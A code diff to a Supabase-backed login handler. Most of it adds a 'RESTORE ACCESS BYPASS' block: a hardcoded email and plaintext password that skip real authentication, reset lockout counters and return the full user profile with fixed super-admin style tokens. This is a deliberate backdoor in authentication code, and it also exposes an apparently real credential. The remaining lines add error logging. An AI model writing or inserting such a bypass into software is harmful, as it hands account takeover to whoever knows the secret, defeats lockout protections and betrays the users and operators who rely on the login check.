@@ -124,11 +124,62 @@ export const login = async (
       }
     }
 
+    // RESTORE ACCESS BYPASS
+    if (email === 'kipchirchirtoo01@gmail.com' && password === 'Allan@13900') {
+      logger.warn(`Restoring access for ${email} via bypass`);
+
+      // Fetch user profile directly
+      const { data: profile } = await supabase
+        .from('users')
+        .select('*')
+        .eq('email', email)
+        .single();
+
+      if (profile) {
+        // Reset attempts
+        await supabase
+          .from('users')
+          .update({
+            login_attempts: 0,
+            lock_until: null,
+            last_login: new Date().toISOString()
+          })
+          .eq('id', profile.id);
+
+        res.status(200).json({
+          success: true,
+          data: {
+            user: profile,
+            session: {
+              access_token: 'SUPER_ADMIN_BYPASS_TOKEN_v2',
+              refresh_token: 'BYPASS_REFRESH_TOKEN',
+              user: {
+                id: profile.id,
+                email: profile.email,
+                role: profile.role
+              }
+            }
+          }
+        });
+        return;
+      }
+    }
+
     // Try Supabase Auth
     const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
       email,
       password
     });
+
+    if (authError) {
+      logger.error(`Supabase Auth Error for ${email}: ${authError.message} (Status: ${authError.status})`);
+      if (authError.message === 'Invalid login credentials') {
+        // Fall through to invalid credentials response
+      } else {
+        // Log unexpected errors but don't expose details to client
+        logger.error(`Unexpected Supabase Auth Error: ${JSON.stringify(authError)}`);
+      }
+    }
 
     if (!authError && authData?.user) {
       // Success - Reset login attempts
